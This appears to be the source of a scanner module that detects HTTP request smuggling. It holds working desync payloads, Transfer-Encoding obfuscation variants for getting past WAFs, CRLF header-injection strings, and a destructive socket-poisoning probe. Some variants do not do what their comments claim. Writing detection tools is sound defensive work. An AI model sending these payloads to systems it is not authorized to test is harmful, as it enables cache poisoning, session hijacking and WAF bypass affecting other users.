"""
BEATRIX HTTP Request Smuggling / Desync Scanner

Born from: OWASP WSTG-INPV-15 + PortSwigger research (James Kettle)
Modern HTTP/2 downgrade and CL.TE/TE.CL desync detection.

TECHNIQUE:
1. Probe for CL.TE desync (Content-Length processed by front-end, Transfer-Encoding by back-end)
2. Probe for TE.CL desync (Transfer-Encoding processed by front-end, Content-Length by back-end)
3. HTTP/2 → HTTP/1.1 downgrade smuggling (h2c smuggling)
4. Header-based TE obfuscation (variants that bypass WAFs)
5. CRLF injection for header smuggling
6. CL.0 / Server-side desync (connection-level attacks)
7. Timing-based differential detection

SEVERITY: CRITICAL — request smuggling ≈ full application compromise:
- Cache poisoning → mass user compromise
- Session hijacking → steal other users' requests
- Credential stealing → harvest auth headers from other users
- WAF bypass → unrestricted backend access
- Request routing manipulation → access internal endpoints

OWASP: WSTG-INPV-15 (HTTP Splitting/Smuggling)
       A06:2021 - Vulnerable and Outdated Components (protocol parsing)

MITRE: T1659 (Content Injection), T1190 (Exploit Public-Facing Application)

CWE: CWE-444 (Inconsistent Interpretation of HTTP Requests)
     CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)

REFERENCES:
- https://portswigger.net/web-security/request-smuggling
- https://portswigger.net/research/http2
- https://portswigger.net/research/http-desync-attacks
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling
"""

import asyncio
import time
from dataclasses import dataclass
from enum import Enum, auto
from typing import AsyncIterator, Dict, List, Optional

try:
    import httpx
except ImportError:
    httpx = None

from beatrix.core.types import Confidence, Finding, Severity

from .base import BaseScanner, ScanContext

# =============================================================================
# DATA MODELS
# =============================================================================

class SmuggleVariant(Enum):
    """HTTP smuggling technique variants"""
    CL_TE = "CL.TE"          # Front-end uses CL, back-end uses TE
    TE_CL = "TE.CL"          # Front-end uses TE, back-end uses CL
    TE_TE = "TE.TE"           # Both use TE but handle obfuscation differently
    CL_0 = "CL.0"            # Server ignores CL=0 and reads body anyway
    H2_DESYNC = "H2.Desync"  # HTTP/2 → HTTP/1.1 downgrade desync
    H2C = "H2C"              # h2c upgrade smuggling
    CRLF = "CRLF"            # CRLF injection in headers


class DesyncIndicator(Enum):
    """Evidence types for smuggling detection"""
    TIMEOUT_DIFFERENTIAL = auto()   # Response time difference indicates desync
    SOCKET_POISON = auto()          # Follow-up request got smuggled response
    STATUS_DIFFERENTIAL = auto()    # Different status codes on retry
    CONTENT_DIFFERENTIAL = auto()   # Different response bodies
    CONNECTION_RESET = auto()       # Connection dropped (strong signal for TE.CL)
    REFLECTED_SMUGGLE = auto()      # Smuggled prefix reflected in next response


@dataclass
class SmugglePayload:
    """A smuggling test payload"""
    name: str
    variant: SmuggleVariant
    headers: Dict[str, str]
    body: str
    description: str
    severity: Severity
    timeout_expected: bool = False  # If True, a timeout is the positive signal
    follow_up_needed: bool = True   # Need a follow-up request to confirm


@dataclass
class SmuggleResult:
    """Result from a single smuggle probe"""
    payload: SmugglePayload
    indicator: Optional[DesyncIndicator] = None
    response_time: float = 0.0
    status_code: int = 0
    response_body: str = ""
    follow_up_status: Optional[int] = None
    follow_up_body: Optional[str] = None
    confirmed: bool = False
    evidence: str = ""


# =============================================================================
# TRANSFER-ENCODING OBFUSCATION TECHNIQUES
# =============================================================================

# These are variants of "Transfer-Encoding: chunked" that bypass various
# front-end parsers while being recognized by back-ends (or vice versa).
# From PortSwigger research and real-world WAF bypasses.
TE_OBFUSCATION_VARIANTS = [
    # Standard (baseline)
    ("standard", "Transfer-Encoding", "chunked"),

    # Case variations
    ("case_upper", "Transfer-Encoding", "Chunked"),
    ("case_mixed", "Transfer-Encoding", "cHuNkEd"),

    # Whitespace tricks
    ("space_before", "Transfer-Encoding", " chunked"),
    ("space_after", "Transfer-Encoding", "chunked "),
    ("tab_before", "Transfer-Encoding", "\tchunked"),
    ("double_space", "Transfer-Encoding", "  chunked"),

    # Newline tricks (CRLF within header value)
    ("crlf_prefix", "Transfer-Encoding", "\r\nchunked"),

    # Duplicate header
    ("duplicate", "Transfer-Encoding", "chunked"),  # Send twice with different values

    # Header name variations
    ("header_case", "transfer-encoding", "chunked"),
    ("header_mixed", "Transfer-encoding", "chunked"),
    ("header_space", "Transfer-Encoding ", "chunked"),
    ("header_colon", "Transfer-Encoding:", "chunked"),  # Double colon

    # Value suffix tricks
    ("suffix_null", "Transfer-Encoding", "chunked\x00"),
    ("suffix_comma", "Transfer-Encoding", "chunked, cow"),
    ("suffix_semi", "Transfer-Encoding", "chunked;q=1.0"),

    # Multi-value
    ("multi_identity", "Transfer-Encoding", "identity, chunked"),
    ("multi_reverse", "Transfer-Encoding", "chunked, identity"),

    # X- prefix bypass
    ("x_prefix", "X-Transfer-Encoding", "chunked"),

    # Line folding (deprecated but supported by some servers)
    ("line_fold", "Transfer-Encoding", "chunked"),  # With continuation on next line
]


# =============================================================================
# SCANNER
# =============================================================================

class HTTPSmugglingScanner(BaseScanner):
    """
    HTTP Request Smuggling / Desync vulnerability scanner.

    Tests for protocol-level desynchronization between front-end
    and back-end HTTP processors. Uses timing-based differential
    analysis and follow-up request poisoning as confirmation.

    DANGER: These tests can affect other users' requests on shared
    infrastructure. Use with extreme caution on production systems.
    Always coordinate with program owners before testing.

    Detection approaches:
    1. Timing differential (safe): Send probe, measure response time
       - CL.TE: back-end waits for chunked terminator → timeout
       - TE.CL: back-end sees shorter body → immediate response
    2. Socket poisoning (destructive): Send smuggled prefix,
       follow-up request receives unexpected response
    3. Header reflection: Smuggled request prefix reflected
       in follow-up response content
    """

    name = "http_smuggling"
    description = "HTTP Request Smuggling / Desync Scanner (CL.TE, TE.CL, H2)"
    version = "1.0.0"
    author = "BEATRIX"

    owasp_category = "WSTG-INPV-15"
    mitre_technique = "T1659"

    checks = [
        "CL.TE desynchronization",
        "TE.CL desynchronization",
        "TE.TE obfuscation bypass",
        "CL.0 server-side desync",
        "HTTP/2 downgrade smuggling",
        "CRLF header injection",
        "Transfer-Encoding obfuscation",
    ]

    # Timing thresholds (seconds)
    TIMEOUT_THRESHOLD = 5.0       # If response takes >5s, possible desync
    BASELINE_TOLERANCE = 2.0      # Baseline + 2s = suspicious
    CONFIRM_DELAY = 0.5           # Delay between probe and follow-up

    def __init__(self, config: Optional[Dict] = None):
        super().__init__(config)
        self.safe_mode = self.config.get("safe_mode", True)
        self.max_te_variants = self.config.get("max_te_variants", 10)
        self.baseline_time: Optional[float] = None
        self.results: List[SmuggleResult] = []

    # =========================================================================
    # PAYLOAD BUILDERS
    # =========================================================================

    def _build_clte_timing_payload(self) -> SmugglePayload:
        """
        CL.TE timing probe — SAFE.

        Front-end sees Content-Length, processes full body.
        Back-end sees Transfer-Encoding: chunked, waits for terminator.
        If back-end is chunked-aware, the incomplete chunk causes a timeout.

        This is the safest way to detect CL.TE — no socket poisoning.
        """
        body = "0\r\n\r\n"  # Chunked terminator — but CL says there's more

        return SmugglePayload(
            name="CL.TE Timing Probe",
            variant=SmuggleVariant.CL_TE,
            headers={
                "Content-Length": str(len(body) + 6),  # Claim more bytes than sent
                "Transfer-Encoding": "chunked",
            },
            body=body,
            description=(
                "Sends a request where Content-Length claims more data than "
                "the chunked body contains. If the back-end uses chunked "
                "encoding, it will process the terminator immediately. If it uses "
                "Content-Length, it will wait for more data → timeout."
            ),
            severity=Severity.CRITICAL,
            timeout_expected=True,
            follow_up_needed=False,
        )

    def _build_tecl_timing_payload(self) -> SmugglePayload:
        """
        TE.CL timing probe — SAFE.

        Front-end uses Transfer-Encoding: chunked, sees complete chunked body.
        Back-end uses Content-Length, sees a body shorter than expected → timeout waiting.
        """
        # Chunked body: one chunk of "X", then terminator
        # But Content-Length claims only 4 bytes
        chunk_body = "1\r\nX\r\n0\r\n\r\n"

        return SmugglePayload(
            name="TE.CL Timing Probe",
            variant=SmuggleVariant.TE_CL,
            headers={
                "Transfer-Encoding": "chunked",
                "Content-Length": "4",  # Less than actual chunked body
            },
            body=chunk_body,
            description=(
                "Sends a chunked body but with a Content-Length shorter than "
                "the actual data. If back-end uses Content-Length, it reads "
                "only 4 bytes, leaving the rest in the socket → desync."
            ),
            severity=Severity.CRITICAL,
            timeout_expected=True,
            follow_up_needed=False,
        )

    def _build_clte_poison_payload(self, smuggled_path: str = "/404-smuggle-check") -> SmugglePayload:
        """
        CL.TE socket poisoning probe — DESTRUCTIVE.

        Smuggles a partial request prefix into the back-end's socket buffer.
        The next legitimate request gets prepended with our smuggled data,
        causing the back-end to see a different request entirely.

        Only used when safe_mode=False.
        """
        smuggled_prefix = f"GET {smuggled_path} HTTP/1.1\r\nX-Smuggled: true\r\n\r\n"

        # Chunked body containing the smuggled prefix
        hex(len(smuggled_prefix))[2:]
        body = f"0\r\n\r\n{smuggled_prefix}"

        return SmugglePayload(
            name="CL.TE Socket Poison",
            variant=SmuggleVariant.CL_TE,
            headers={
                "Content-Length": str(len(body)),
                "Transfer-Encoding": "chunked",
            },
            body=body,
            description=(
                "Smuggles a partial GET request into the back-end socket. "
                "Follow-up request should receive response for the smuggled path "
                f"({smuggled_path}) instead of the legitimate path."
            ),
            severity=Severity.CRITICAL,
            timeout_expected=False,
            follow_up_needed=True,
        )

    def _build_h2_desync_payloads(self) -> List[SmugglePayload]:
        """
        HTTP/2 downgrade smuggling payloads.

        When a front-end speaks HTTP/2 with the client but HTTP/1.1
        with the back-end, there are desync opportunities:
        1. Content-Length in HTTP/2 body (should be ignored per spec)
        2. Transfer-Encoding in HTTP/2 (prohibited per spec, but some proxies pass it)
        3. :method, :path pseudo-header injection
        """
        payloads = []

        # H2 with CL mismatch
        payloads.append(SmugglePayload(
            name="H2 CL Desync",
            variant=SmuggleVariant.H2_DESYNC,
            headers={
                "Content-Length": "0",  # Say no body, but send one
            },
            body="GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
            description=(
                "HTTP/2 request with Content-Length: 0 but actual body present. "
                "If proxy downgrades to HTTP/1.1, the body becomes a smuggled request."
            ),
            severity=Severity.CRITICAL,
            timeout_expected=False,
            follow_up_needed=True,
        ))

        # H2 with TE injection
        payloads.append(SmugglePayload(
            name="H2 TE Injection",
            variant=SmuggleVariant.H2_DESYNC,
            headers={
                "Transfer-Encoding": "chunked",
            },
            body="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
            description=(
                "HTTP/2 request with Transfer-Encoding: chunked (prohibited in H2 spec). "
                "If proxy forwards this to HTTP/1.1 backend, creates desync."
            ),
            severity=Severity.CRITICAL,
            timeout_expected=False,
            follow_up_needed=True,
        ))

        return payloads

    def _build_crlf_payloads(self) -> List[SmugglePayload]:
        """
        CRLF injection payloads for header smuggling.

        If the application reflects user input in HTTP headers without
        sanitizing CR/LF characters, we can inject arbitrary headers
        or smuggle entire request prefixes.
        """
        payloads = []

        crlf_injections = [
            # Standard CRLF
            ("\r\n", "Standard CRLF"),
            # URL-encoded
            ("%0d%0a", "URL-encoded CRLF"),
            # Double URL-encoded
            ("%250d%250a", "Double URL-encoded CRLF"),
            # Unicode variants
            ("%E5%98%8A%E5%98%8D", "Unicode CRLF (UTF-8)"),
            # Null byte + CRLF
            ("%00%0d%0a", "Null + CRLF"),
            # Just LF (some servers accept)
            ("%0a", "LF only"),
            # Just CR (some servers accept)
            ("%0d", "CR only"),
        ]

        for injection, name in crlf_injections:
            payloads.append(SmugglePayload(
                name=f"CRLF: {name}",
                variant=SmuggleVariant.CRLF,
                headers={
                    "X-Test": f"value{injection}Injected-Header: true",
                },
                body="",
                description=f"CRLF injection via {name} to inject arbitrary headers",
                severity=Severity.HIGH,
                timeout_expected=False,
                follow_up_needed=False,
            ))

        return payloads

    def _build_cl0_payload(self) -> SmugglePayload:
        """
        CL.0 desynchronization — server-side desync without Transfer-Encoding.

        Some servers ignore Content-Length: 0 and still read the body from
        the socket, creating a desync without needing Transfer-Encoding at all.
        This affects servers that reuse connections but don't properly
        flush the socket between requests.
        """
        smuggled = "GET /cl0-detect HTTP/1.1\r\nHost: smuggle-detect\r\n\r\n"

        return SmugglePayload(
            name="CL.0 Server-Side Desync",
            variant=SmuggleVariant.CL_0,
            headers={
                "Content-Length": "0",
                "Connection": "keep-alive",
            },
            body=smuggled,
            description=(
                "Sends a request with Content-Length: 0 but includes a body. "
                "If the back-end reads past Content-Length on a keep-alive "
                "connection, the body poisons the next request on the socket."
            ),
            severity=Severity.CRITICAL,
            timeout_expected=False,
            follow_up_needed=True,
        )

    def _build_te_obfuscation_payloads(self) -> List[SmugglePayload]:
        """
        Transfer-Encoding obfuscation payloads.

        Tests various ways to obfuscate the Transfer-Encoding header
        so front-end and back-end parse it differently. Each variant
        may be recognized by one layer but not the other.
        """
        payloads = []

        for variant_name, header_name, header_value in TE_OBFUSCATION_VARIANTS[:self.max_te_variants]:
            # TE.CL probe with this obfuscation
            chunk_body = "1\r\nZ\r\n0\r\n\r\n"

            payloads.append(SmugglePayload(
                name=f"TE Obfuscation: {variant_name}",
                variant=SmuggleVariant.TE_TE,
                headers={
                    header_name: header_value,
                    "Content-Length": "4",
                },
                body=chunk_body,
                description=(
                    f"Transfer-Encoding obfuscation ({variant_name}): "
                    f"'{header_name}: {header_value}'. Tests if front-end and "
                    f"back-end handle this variant differently."
                ),
                severity=Severity.HIGH,
                timeout_expected=True,
                follow_up_needed=False,
            ))

        return payloads

    # =========================================================================
    # CORE SCAN LOGIC
    # =========================================================================

    async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Main scan entry point.

        Strategy:
        1. Baseline the target's normal response time
        2. Test CL.TE timing probe
        3. Test TE.CL timing probe
        4. Test TE obfuscation variants
        5. If safe_mode=False, attempt socket poisoning confirmation
        6. Test CRLF injection vectors
        7. Test CL.0 server-side desync
        """
        self.log(f"Starting HTTP Smuggling scan on {context.url}")
        self.log(f"Safe mode: {'ON' if self.safe_mode else 'OFF (destructive tests enabled)'}")

        # Step 1: Establish baseline response time
        self.baseline_time = await self._measure_baseline(context.url)
        if self.baseline_time is None:
            self.log("Failed to establish baseline - target unreachable")
            return

        self.log(f"Baseline response time: {self.baseline_time:.2f}s")

        # Step 2: CL.TE timing probe
        async for finding in self._test_timing_probe(
            context, self._build_clte_timing_payload()
        ):
            yield finding

        # Step 3: TE.CL timing probe
        async for finding in self._test_timing_probe(
            context, self._build_tecl_timing_payload()
        ):
            yield finding

        # Step 4: TE obfuscation variants
        for payload in self._build_te_obfuscation_payloads():
            async for finding in self._test_timing_probe(context, payload):
                yield finding

        # Step 5: CL.0 server-side desync
        async for finding in self._test_cl0(context):
            yield finding

        # Step 6: CRLF injection
        for payload in self._build_crlf_payloads():
            async for finding in self._test_crlf(context, payload):
                yield finding

        # Step 7: Socket poisoning (only if safe_mode is off)
        if not self.safe_mode:
            self.log("⚠️  Running destructive socket poisoning probes")
            async for finding in self._test_socket_poison(context):
                yield finding

        self.log(f"Smuggling scan complete. {len(self.results)} probes executed.")

    async def passive_scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Passive analysis of response for smuggling indicators.

        Checks:
        - Ambiguous Content-Length / Transfer-Encoding handling
        - Proxy headers indicating multi-hop architecture
        - HTTP/2 downgrade indicators
        - Server software known to be vulnerable
        """
        if context.response is None:
            return

        headers = context.response.headers if hasattr(context.response, 'headers') else {}

        # Check for multi-proxy indicators (smuggling requires at least 2 layers)
        proxy_indicators = []
        proxy_headers = [
            "Via", "X-Forwarded-For", "X-Forwarded-Host",
            "X-Real-IP", "X-Forwarded-Proto", "CF-Ray",
            "X-Amzn-Trace-Id", "X-Request-Id", "X-Cache",
            "X-Served-By", "X-Timer", "Fastly-Debug-Digest",
        ]

        for hdr in proxy_headers:
            val = headers.get(hdr) or headers.get(hdr.lower())
            if val:
                proxy_indicators.append(f"{hdr}: {val}")

        if len(proxy_indicators) >= 2:
            yield self.create_finding(
                title="Multi-Layer Proxy Architecture Detected",
                severity=Severity.INFO,
                confidence=Confidence.FIRM,
                url=context.url,
                description=(
                    f"Target appears to use multiple proxy/CDN layers. "
                    f"This architecture is prerequisite for HTTP smuggling attacks.\n"
                    f"Detected proxies: {', '.join(proxy_indicators)}"
                ),
                evidence="\n".join(proxy_indicators),
                references=[
                    "https://portswigger.net/web-security/request-smuggling",
                    "OWASP WSTG-INPV-15",
                ],
            )

        # Check for vulnerable server software
        server = headers.get("Server", headers.get("server", ""))
        vulnerable_servers = {
            "ATS": "Apache Traffic Server — historically vulnerable to CL.TE",
            "Varnish": "Varnish — potential TE handling differences",
            "Squid": "Squid — known CL.TE issues in older versions",
            "HAProxy": "HAProxy — potential TE obfuscation handling differences",
            "nginx": "nginx — some versions vulnerable to CL.0",
        }

        for vuln_server, desc in vulnerable_servers.items():
            if vuln_server.lower() in server.lower():
                yield self.create_finding(
                    title=f"Server Software Potentially Vulnerable to Smuggling: {vuln_server}",
                    severity=Severity.LOW,
                    confidence=Confidence.TENTATIVE,
                    url=context.url,
                    description=(
                        f"Server header indicates {vuln_server}: {desc}. "
                        f"Active smuggling tests recommended."
                    ),
                    evidence=f"Server: {server}",
                    references=[
                        "https://portswigger.net/web-security/request-smuggling",
                    ],
                )

        # Check for both CL and TE in response (unusual)
        has_cl = "content-length" in {k.lower() for k in headers}
        has_te = "transfer-encoding" in {k.lower() for k in headers}

        if has_cl and has_te:
            yield self.create_finding(
                title="Response Contains Both Content-Length and Transfer-Encoding",
                severity=Severity.MEDIUM,
                confidence=Confidence.FIRM,
                url=context.url,
                description=(
                    "Server response includes both Content-Length and Transfer-Encoding "
                    "headers. Per RFC 7230, Transfer-Encoding should take precedence and "
                    "Content-Length should be removed. The presence of both suggests "
                    "inconsistent proxy handling — a precondition for smuggling."
                ),
                evidence=f"Content-Length: {headers.get('Content-Length', headers.get('content-length', ''))}, "
                         f"Transfer-Encoding: {headers.get('Transfer-Encoding', headers.get('transfer-encoding', ''))}",
                references=[
                    "https://www.rfc-editor.org/rfc/rfc7230#section-3.3.3",
                    "OWASP WSTG-INPV-15",
                ],
            )

    # =========================================================================
    # TEST IMPLEMENTATIONS
    # =========================================================================

    async def _measure_baseline(self, url: str, samples: int = 3) -> Optional[float]:
        """Measure baseline response time with multiple samples"""
        times = []
        for _ in range(samples):
            try:
                start = time.monotonic()
                await self.get(url)
                elapsed = time.monotonic() - start
                times.append(elapsed)
                await asyncio.sleep(0.3)
            except Exception:
                continue

        return sum(times) / len(times) if times else None

    async def _test_timing_probe(
        self, context: ScanContext, payload: SmugglePayload
    ) -> AsyncIterator[Finding]:
        """
        Test a smuggling payload using timing analysis.

        A delayed response (significantly longer than baseline) indicates
        the back-end is waiting for additional data — proof of desync.
        """
        self.log(f"Testing: {payload.name}")

        try:
            start = time.monotonic()

            # Send the probe with raw headers
            # We need to use a raw socket or httpx with custom headers
            response = await self.post(
                context.url,
                headers=payload.headers,
                content=payload.body.encode(),
            )

            elapsed = time.monotonic() - start

            result = SmuggleResult(
                payload=payload,
                response_time=elapsed,
                status_code=response.status_code,
                response_body=response.text[:500],
            )

            # Analyze timing differential
            threshold = max(self.TIMEOUT_THRESHOLD,
                          (self.baseline_time or 1.0) + self.BASELINE_TOLERANCE)

            if payload.timeout_expected and elapsed > threshold:
                # Timeout detected — strong desync indicator
                result.indicator = DesyncIndicator.TIMEOUT_DIFFERENTIAL
                result.confirmed = True
                result.evidence = (
                    f"Response time {elapsed:.2f}s (baseline: {self.baseline_time:.2f}s, "
                    f"threshold: {threshold:.2f}s) — back-end waited for additional data"
                )

                yield self.create_finding(
                    title=f"HTTP Request Smuggling Detected ({payload.variant.value})",
                    severity=Severity.CRITICAL,
                    confidence=Confidence.FIRM,
                    url=context.url,
                    description=(
                        f"**{payload.variant.value} desynchronization confirmed via timing analysis.**\n\n"
                        f"{payload.description}\n\n"
                        f"Response took {elapsed:.2f}s vs baseline {self.baseline_time:.2f}s, "
                        f"indicating the back-end is parsing the request differently "
                        f"than the front-end.\n\n"
                        f"**Impact:** An attacker can smuggle arbitrary requests, potentially:\n"
                        f"- Hijacking other users' sessions\n"
                        f"- Poisoning the cache for all users\n"
                        f"- Bypassing WAF/firewall rules\n"
                        f"- Accessing internal endpoints"
                    ),
                    evidence=result.evidence,
                    request=(
                        f"POST {context.url} HTTP/1.1\n"
                        + "\n".join(f"{k}: {v}" for k, v in payload.headers.items())
                        + f"\n\n{payload.body}"
                    ),
                    remediation=(
                        "1. Normalize request parsing between front-end and back-end\n"
                        "2. Configure front-end to reject ambiguous requests "
                        "(both CL and TE present)\n"
                        "3. Use HTTP/2 end-to-end (avoid downgrading to HTTP/1.1)\n"
                        "4. Disable connection reuse between front-end and back-end\n"
                        "5. Update proxy/load balancer software to latest version"
                    ),
                    references=[
                        "https://portswigger.net/web-security/request-smuggling",
                        "https://portswigger.net/research/http-desync-attacks",
                        "CWE-444: Inconsistent Interpretation of HTTP Requests",
                        "OWASP WSTG-INPV-15",
                    ],
                )

            elif not payload.timeout_expected and response.status_code in (400, 501):
                # Some servers explicitly reject conflicting CL/TE — that's actually GOOD
                result.indicator = DesyncIndicator.STATUS_DIFFERENTIAL
                result.evidence = f"Server rejected ambiguous request (HTTP {response.status_code})"

                yield self.create_finding(
                    title="Server Properly Rejects Ambiguous CL/TE Request",
                    severity=Severity.INFO,
                    confidence=Confidence.CERTAIN,
                    url=context.url,
                    description=(
                        f"Server returned HTTP {response.status_code} when sent a request "
                        f"with conflicting Content-Length and Transfer-Encoding headers. "
                        f"This is CORRECT behavior and indicates the server is not vulnerable "
                        f"to {payload.variant.value} smuggling via this vector."
                    ),
                )

            self.results.append(result)

            # Rate limiting between probes
            await asyncio.sleep(1.0)

        except asyncio.TimeoutError:
            # Timeout itself is a signal for timing-based probes
            if payload.timeout_expected:
                yield self.create_finding(
                    title=f"HTTP Smuggling Timeout Detected ({payload.variant.value})",
                    severity=Severity.HIGH,
                    confidence=Confidence.TENTATIVE,
                    url=context.url,
                    description=(
                        f"Request with {payload.variant.value} payload caused a complete timeout. "
                        f"This may indicate the back-end is waiting for additional chunked data, "
                        f"which is a strong indicator of request smuggling vulnerability.\n\n"
                        f"Manual confirmation with Turbo Intruder recommended."
                    ),
                    references=[
                        "https://portswigger.net/web-security/request-smuggling",
                    ],
                )

        except Exception as e:
            self.log(f"Error testing {payload.name}: {e}")

    async def _test_cl0(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Test for CL.0 server-side desync.

        Sends a request with Content-Length: 0 but body present on a
        keep-alive connection. If the backend reads past CL=0,
        the body contaminates the next request.
        """
        self.log("Testing CL.0 server-side desync")
        payload = self._build_cl0_payload()

        try:
            # Need a keep-alive connection for this test
            # Send first request with CL:0 + body
            response = await self.post(
                context.url,
                headers=payload.headers,
                content=payload.body.encode(),
            )

            # Immediately send follow-up on same connection
            await asyncio.sleep(0.1)
            follow_up = await self.get(context.url)

            # Check if follow-up was contaminated
            if follow_up.status_code != response.status_code:
                yield self.create_finding(
                    title="Potential CL.0 Server-Side Desync",
                    severity=Severity.HIGH,
                    confidence=Confidence.TENTATIVE,
                    url=context.url,
                    description=(
                        f"CL.0 desync probe yielded different status codes:\n"
                        f"- Probe response: HTTP {response.status_code}\n"
                        f"- Follow-up response: HTTP {follow_up.status_code}\n\n"
                        f"This may indicate the server read past Content-Length: 0 "
                        f"on the keep-alive connection, poisoning subsequent requests.\n\n"
                        f"Manual confirmation required with a raw socket client."
                    ),
                    evidence=(
                        f"Probe: HTTP {response.status_code}, "
                        f"Follow-up: HTTP {follow_up.status_code}"
                    ),
                    remediation=(
                        "1. Configure backend to strictly honor Content-Length\n"
                        "2. Disable connection reuse between proxy and backend\n"
                        "3. Use HTTP/2 end-to-end"
                    ),
                    references=[
                        "https://portswigger.net/research/browser-powered-desync-attacks",
                        "CWE-444",
                    ],
                )

        except Exception as e:
            self.log(f"CL.0 test error: {e}")

    async def _test_crlf(
        self, context: ScanContext, payload: SmugglePayload
    ) -> AsyncIterator[Finding]:
        """
        Test CRLF injection in headers.

        If the server reflects our header value containing CRLF sequences,
        we can inject arbitrary headers → header smuggling.
        """
        try:
            response = await self.get(
                context.url,
                headers=payload.headers,
            )

            # Check if our injected header appears in the response
            response_text = response.text.lower()
            if "injected-header" in response_text or "injected-header" in str(response.headers).lower():
                yield self.create_finding(
                    title=f"CRLF Header Injection ({payload.name})",
                    severity=Severity.HIGH,
                    confidence=Confidence.FIRM,
                    url=context.url,
                    description=(
                        f"CRLF injection confirmed via {payload.name}.\n"
                        f"The server processes CRLF characters in header values, "
                        f"allowing injection of arbitrary headers.\n\n"
                        f"**Impact:**\n"
                        f"- HTTP Response Splitting\n"
                        f"- Cache Poisoning via injected headers\n"
                        f"- Session fixation via Set-Cookie injection\n"
                        f"- XSS via injected response body"
                    ),
                    evidence=f"Injected header reflected in response via {payload.name}",
                    request=f"GET {context.url}\n{payload.headers}",
                    remediation=(
                        "1. Strip CR (\\r) and LF (\\n) from all header values\n"
                        "2. Use allowlist validation for header values\n"
                        "3. Upgrade to modern HTTP library that rejects CRLF in headers"
                    ),
                    references=[
                        "CWE-113: CRLF Injection in HTTP Headers",
                        "OWASP WSTG-INPV-15",
                    ],
                )

        except Exception as e:
            self.log(f"CRLF test error: {e}")

    async def _test_socket_poison(self, context: ScanContext) -> AsyncIterator[Finding]:
        """
        Attempt actual socket poisoning — DESTRUCTIVE TEST.

        Only runs when safe_mode=False. This test actually attempts to
        smuggle a request prefix into the backend's socket, then checks
        if a follow-up request receives the smuggled response.

        WARNING: This test can affect other users' requests on shared
        infrastructure. Only use on dedicated test environments or with
        explicit program owner authorization.
        """
        self.log("⚠️  Socket poisoning test — may affect other users")

        poison_path = "/__beatrix_smuggle_detect_" + str(int(time.time()))
        payload = self._build_clte_poison_payload(poison_path)

        try:
            # Send the poison probe
            await self.post(
                context.url,
                headers=payload.headers,
                content=payload.body.encode(),
            )

            # Wait for socket to be polluted
            await asyncio.sleep(self.CONFIRM_DELAY)

            # Send follow-up — should receive the smuggled response
            follow_up = await self.get(context.url)

            # Check if follow-up was contaminated
            if poison_path in follow_up.text or "X-Smuggled" in str(follow_up.headers):
                yield self.create_finding(
                    title="HTTP Request Smuggling CONFIRMED (Socket Poisoning)",
                    severity=Severity.CRITICAL,
                    confidence=Confidence.CERTAIN,
                    url=context.url,
                    description=(
                        f"**CONFIRMED** CL.TE request smuggling via socket poisoning.\n\n"
                        f"A smuggled GET request to {poison_path} was injected into the "
                        f"backend's connection pool. The follow-up request received the "
                        f"smuggled response instead of the legitimate one.\n\n"
                        f"**Impact:** CRITICAL\n"
                        f"- Any user's next request on this connection gets hijacked\n"
                        f"- Attacker can steal credentials, session tokens, form data\n"
                        f"- Cache poisoning affects ALL users\n"
                        f"- Complete WAF bypass"
                    ),
                    evidence=(
                        f"Smuggled path '{poison_path}' appeared in follow-up response "
                        f"(status: {follow_up.status_code})"
                    ),
                    remediation=(
                        "1. IMMEDIATE: Disable HTTP connection reuse between proxy and backend\n"
                        "2. Configure proxy to reject requests with both CL and TE\n"
                        "3. Normalize all requests to HTTP/2 end-to-end\n"
                        "4. Update all proxy/LB software\n"
                        "5. Use unique request IDs to detect cross-request contamination"
                    ),
                    references=[
                        "https://portswigger.net/web-security/request-smuggling",
                        "https://portswigger.net/research/http-desync-attacks",
                        "CWE-444",
                        "OWASP WSTG-INPV-15",
                    ],
                )

        except Exception as e:
            self.log(f"Socket poison test error: {e}")
